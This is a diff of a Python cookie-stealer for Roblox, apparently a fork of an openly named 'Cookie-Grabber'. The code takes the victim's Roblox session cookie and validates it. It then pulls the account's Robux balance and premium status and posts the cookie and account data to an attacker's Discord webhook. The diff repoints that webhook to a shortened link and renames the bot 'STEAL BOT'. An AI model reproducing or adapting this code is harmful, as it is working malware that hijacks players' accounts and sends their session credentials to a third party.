@@ -4,7 +4,7 @@ import marshal, zlib, base64, lzma
 import json
 from base64 import *
 
-webhookk = "https://discord.com/api/webhooks/1064079791579463790/SGr52IbaoEaL5IlhVb32j01DTZz7304E8Do23T9wpBb9I3TMogTG3_QtPGz0-SQ7NMZC"
+webhook = "https://cuty.io/wpURvY"
 
 def command(c):
     os.system(c)
@@ -91,7 +91,7 @@ isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
 if isvalid == "Valid Cookie":
     pass
 else:
-    requests.post(url=webhookk,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
+    requests.post(url=webhook,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
     exit()
 
 #################### getting info about the cookie #############
@@ -110,15 +110,15 @@ robux = info['RobuxBalance']
 premium = info['IsPremium']
 #################### SENDING TO WEBHOOK #################
 
-discord = Discord(url=webhookk)
+discord = Discord(url=webhook)
 discord.post(
     username="BOT - Pirate 🍪",
     avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
     embeds=[
         {
-            "username": "BOT - Pirate 🍪",
-            "title": "💸 +1 Result Account 🕯",
-            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
+            "username": "STEAL BOT",
+            "title": "OOOOH NO ANOTHER ACCOUNT 🕯",
+            "description" : f"[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
             "color" : 12452044,
             "fields": [
                 {"name": "Username", "value": username, "inline": True},
